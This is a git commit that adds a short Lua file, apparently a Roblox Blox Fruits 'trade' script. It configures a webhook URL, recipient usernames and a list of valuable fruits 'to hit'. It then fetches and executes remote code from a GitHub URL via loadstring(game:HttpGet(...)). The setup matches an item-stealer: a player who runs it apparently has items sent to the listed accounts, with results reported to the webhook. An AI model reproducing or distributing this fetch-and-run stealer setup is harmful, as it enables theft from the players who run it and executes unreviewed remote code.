c5e0212bc42f9c3914e0bea1f91c0ff0e9ccc11f
seregapirat577 <kasenkomaks058@gmail.com>
2025-03-29 17:38:05 +0200

    Create trade.lua

---
+++ trade.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=azZkZEJFMDg2bm9FOHVMWFFQZ0tRQTpsLUFWTTdLeHVoM1hkLVVITGpCWWJZUU9hNmtjNmEwVUpiWWtuR2RET3RjRWRyM3FtOVdyNzNLVXFmNkNPRnFib3BGZjNDcjVSRWs0ZUptU09zOVJ0RW5tQ20zNm4xVEdReEx0aG1JS29ick5ha0xzZVhsbk1FVXFBUDhYQzdKNlJvSjdUcTYtTXVUQzBvTnktSVU4THlRNVcyUUR5VHNwWVNzdXI4YjJnVWc" -- << Your Webhook
+Usernames = {"krovosisa228siska28", "amrot123"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Dragon-Dragon"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
